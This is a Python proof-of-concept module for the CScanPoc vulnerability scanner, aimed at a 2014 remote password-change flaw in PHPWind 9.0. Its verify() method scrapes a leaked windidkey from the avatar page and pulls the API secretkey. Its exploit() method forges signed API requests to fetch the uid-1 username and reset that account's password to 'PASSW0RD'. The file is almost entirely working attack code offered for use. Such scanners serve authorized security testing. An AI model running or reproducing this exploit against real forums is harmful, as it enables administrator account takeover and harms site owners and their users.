# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

import re
import time
import json
import urllib
from hashlib import md5


class Vuln(ABVuln):
    vuln_id = 'PHPWind_0002_p'  # 平台漏洞编号，留空
    name = 'PHPWind 9.0 /src/windid/service/user/srv/WindidUserService.php 远程密码修改漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-08-17'  # 漏洞公布时间
    desc = '''
        phpwind（简称：pw）是一个基于PHP和MySQL的开源社区程序，是国内最受欢迎的通用型论坛程序之一。
        PHPWind v9.0版本中上传头像处误将访问api的密钥泄露，导致 secretkey 泄露，导致可通过api任意修改密码。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = '9.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a38c61f4-74be-4708-8c51-d3c530399c91'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 属于验证后台漏洞，所以需要登录并且获取cookie，详情参考对应的PDF
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # this poc need to login, so special cookie for target must be included in http headers.
            url = self.target
            cookie = ''
            header = {
                'cookie': 'cookie'
            }
            windidkey_url = '%s/index.php?m=profile&c=avatar&_left=avatar' % url
            secretkey_url = '%s/windid/index.php?m=api&c=app&a=list&uid=%s&windidkey=%s&time=%s&clientid=1&type=flash'
            # Regex
            match_uid = re.compile('m=space&uid=([\d])+')
            match_windidkey = re.compile(
                'windidkey%3D([\w\d]{32})%26time%3D([\d]+)%26')
            request = urllib.request.Request(windidkey_url, headers=header)
            response = str(urllib.request.urlopen(request).read())
            # Get windidkey
            try:
                windidkey, _time = match_windidkey.findall(response)[0]
                uid = match_uid.findall(response)[0]
            except:
                return None
            # Get secretkey
            request = urllib.request.Request(secretkey_url % (
                url, uid, windidkey, _time), data='uid=undefined')
            response = json.loads(str(urllib.request.urlopen(request).read()))
            try:
                secretkey = response['1']['secretkey']
            except:
                return None
            # Success
            if secretkey:
                #args['success'] = True
                #args['poc_ret']['vul_url'] = url
                #args['poc_ret']['secretkey'] = secretkey
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            cookie = ''
            header = {
                'cookie': 'cookie'
            }
            vul_url = '%s/windid/index.php?m=api&c=user&a=%s&windidkey=%s&time=%s&clientid=1&userid=1'
            windidkey_url = '%s/index.php?m=profile&c=avatar&_left=avatar' % url
            secretkey_url = '%s/windid/index.php?m=api&c=app&a=list&uid=%s&windidkey=%s&time=%s&clientid=1&type=flash'

            # Regex
            match_uid = re.compile('m=space&uid=([\d])+')
            match_windidkey = re.compile(
                'windidkey%3D([\w\d]{32})%26time%3D([\d]+)%26')
            request = urllib.request.Request(windidkey_url, headers=header)
            response = str(urllib.request.urlopen(request).read())

            # Get windidkey
            try:
                windidkey, _time = match_windidkey.findall(response)[0]
                uid = match_uid.findall(response)[0]
            except:
                return None

            # Get secretkey
            request = urllib.request.Request(secretkey_url % (
                url, uid, windidkey, _time), data='uid=undefined')
            response = json.loads(str(urllib.request.urlopen(request).read()))
            try:
                secretkey = response['1']['secretkey']
            except:
                return None

            # Get username
            data = {'uid': 1}
            string = 'userid1uid1'
            _time = str(int(time.time()))
            app_key = md5('%s%s%s' % (
                md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
            request = urllib.request.Request(vul_url % (
                url, 'get', app_key, _time), data=urllib.parse.urlencode(data))
            response = json.loads(str(urllib.request.urlopen(request).read()))
            try:
                username = response['username']
            except:
                return None

            # Change password
            data = {'password': 'PASSW0RD', 'uid': 1}
            string = 'userid1passwordPASSW0RDuid1'
            _time = str(int(time.time()))
            app_key = md5('%s%s%s' % (
                md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
            request = urllib.request.Request(vul_url % (
                url, 'editUser', app_key, _time), data=urllib.parse.urlencode(data))
            response = str(urllib.request.urlopen(request).read())

            # Success
            if response == '1':
                #args['success'] = True
                #args['poc_ret']['vul_url'] = url
                #args['poc_ret']['secretkey'] = secretkey
                #args['poc_ret']['username'] = username
                #args['poc_ret']['password'] = 'PASSW0RD'
                self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，用户名：{name}，密码：{passwd}'.format(
                    target=self.target, vulnname=self.vuln.name, name=username, passwd='PASSW0RD'))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
